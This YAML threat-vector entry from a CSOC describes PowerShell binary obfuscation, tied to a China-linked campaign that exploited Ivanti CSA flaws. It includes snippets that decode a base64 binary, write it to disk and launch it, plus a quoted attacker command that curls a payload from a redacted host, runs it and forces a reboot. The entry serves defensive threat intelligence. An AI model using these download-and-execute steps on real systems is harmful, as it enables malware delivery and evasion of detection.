name: Obfuscate binaries through PowerShell commands
criticality: Medium
references:
  public:
    1: https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets
    2: https://convert.readthedocs.io/en/latest/functions/ConvertTo-Base64
    3: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5
    4: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.5

metadata:
  uuid: a3df7d01-5fd9-4522-8eaf-f28895046b7d
  schema: tvm::2.1
  version: 1
  created: 2025-06-12
  modified: 2025-06-18
  tlp: clear
  #author: 
  #contributors:
    #-
  organisation:
    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
    name: EC DIGIT CSOC

threat:
  killchain: Defense Evasion
  att&ck:
    - T1190     # Exploit Public-Facing Application
    - T1027.013 # Obfuscated Files or Information: Encrypted/Encoded File
    - T1027.002 # Obfuscated Files or Information: Software Packing
    - T1059.001 # Command and Scripting Interpreter: PowerShell
  chaining:
    - relation: sequence::succeeds
      vector: d1baf8b3-a835-4c95-94f8-d25217896d0f # Open Relay Box networks utilized by threat actors
      description: |
        A Chinese affiliated threat actor leveraged ORB nexus network infrastructure,
        and exploited two vulnerabilities (CVE-2024-8963 and CVE-2024-8190) to
        establish an initial foothold ref [1].  
  cve:
    - CVE-2024-8963 # A critical path traversal flaw in Ivanti Cloud Service Appliance (CSA) allows remote unauthenticated access, cvss: 9.1 (Critical)
    - CVE-2024-8190 # An Ivanti command injection vulnerability in Ivanti Cloud Services Appliance, CVSS: 7.2 (High)
  domains:
    - Enterprise
  terrain: |
    A threat actor needs an initially compromised end-point. 
    Example: A threat actor is using Operational Relay Box (ORB)
    network to gain an initial foothold and access to the victim's
    environment ref [1].
  targets:
    - Customer
    - Laptop
    - Workstations
  platforms:
    - Windows
  severity: Moderate incident
  leverage:
    - Infrastructure Compromise
    - Elevation of privilege
    - Information Disclosure
    - Tampering
  impact:
    - Impairement
    - Business disruption
    - Lose Capabilities
  viability: Likely
  description: |
   Obfuscating binaries through PowerShell commands is a technique
   used to make it difficult for reverse engineers, malware analysts,
   or security researchers to understand the purpose and behavior of
   a binary or script. This is often used by attackers to evade
   detection and analysis.  
  
   ### Some of the methods for binary obfuscation

   - ConvertTo-Base64: Converts a string to a Base64-encoded string.
   - Compress-Archive: Compresses a file or folder using Gzip.
   - Invoke-Expression: Executes a string as a PowerShell expression,
   allowing for dynamic code execution.
   - Add-Type: Loads a .NET assembly, which can be used to execute
   code dynamically.
   - Reflection.Assembly: Loads a .NET assembly using reflection.

   For more information, an examples are given in the ref [2], [3], [4].

   ### A process for base64 encoded binary 

   Usually a base64 encoded binary dropped to a computer is achieved
   via a sequence of PowerShell (PS) commands.

   An example for such pattern is represented in several steps below:

   1. Base64 encoding

   Like a first step, a binary (an executable file, for instance) is encoded 
   in base64. This encoding scheme is used to represent binary data in an ASCII
   string format. This is often done to bypass security controls that might
   block or inspect binary data but allow text.

   2. Dropping the encoded binary

   The base64 encoded string is then "dropped" onto the target computer.
   This could be done through various means, such as being embedded in a script,
   sent via email, or included in a malicious document that executes PowerShell
   commands when opened.

   3. Decoding the binary in PowerShell

   Once the encoded string is on the target system, PowerShell can be used to
   decode it. The [System.Convert]::FromBase64String() method in PowerShell is
   used for this purpose.

   Example for PowerShell obfuscation code

   ```
   encodedString = "YOUR_BASE64_ENCODED_STRING_HERE"
   $decodedBytes = [System.Convert]::FromBase64String($encodedString)
   ```

   4. Saving the decoded Binary to a file

   After decoding, the binary needs to be saved to a file. This can
   be done using the [System.IO.File]::WriteAllBytes() method:

   ```
   $path = "C:\Path\To\Save\YourFile.exe"
   [System.IO.File]::WriteAllBytes($path, $decodedBytes)

   ```
   5. Executing the binary

   Finally, the saved binary can be executed. One of the methods in which
   the threat actors can do this is directly from PowerShell or through
   other means such as creating a shortcut or using other scripts.

   Example:

   ```
   Start-Process -FilePath $path
   ```

    Another example for binary obfuscation through PowerShell commands
    is shown in Chinese-linked cluster threat actor campaign ref [1].  
    
    The threat actor group is observed to obfuscate binaries (in particular
    AppSov.exe) using PowerShell commands.  

    The threat actor deployed AppSov.exe by executing a PowerShell command
    that performs the following actions:

    - A threat actor downloads a binary file named from a remote endpoint
    using the utility curl.exe
    - After they save the downloaded file as `AppSov.exe` in the
    `C:\ProgramData\` directory.
    - Launches the executable using the `Start-Process` PowerShell command.
    - System reboot after some period of time. ref [1].      

    An example for used command:

    ```
    sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
    
    ```
